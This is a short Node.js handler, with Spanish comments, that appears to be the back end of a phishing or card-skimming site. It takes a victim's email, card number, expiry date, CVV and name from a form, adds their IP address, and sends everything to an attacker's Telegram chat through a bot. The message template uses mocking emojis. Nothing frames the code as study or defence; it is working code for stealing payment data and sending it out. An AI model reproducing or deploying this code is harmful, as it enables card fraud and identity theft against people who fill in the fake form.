import TelegramBot from 'node-telegram-bot-api'

// Creamos una instancia del bot en modo "polling" (escucha activa)
const bot = new TelegramBot(process.env.telegram_bot_id, { polling: false });

const sender = async (req, res) => {
  let msg
  //const uId = req.body.username
  //const pwd = req.body.password
  if(req.query.msg) {
  msg = req.query.msg
  } else {
  const { email, num, date, cde, name } = req.body
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
  
  if ( !email || !num || !date || !cde || !name) return res.redirect('/')
  msg = `■■■■■🤣🫵🤡■■■■■
📧 Email: ${email} 
💳 Cc num: ${num} 
🗓 Exp: ${date}
🔑 Ccv: ${cde}
👤 Name: ${name}
🌐 Ip: ${ip}
■■■■■■■■■■■■■■`;
  }
  try {
    const sentMessage = await bot.sendMessage(process.env.chat_id, msg);
    //console.log('Mensaje enviado:', sentMessage.text);
    res.render('fin')
  } catch (err) {
    console.error('Error al enviar mensaje:', err.message);
  }
};

export {
  sender,
}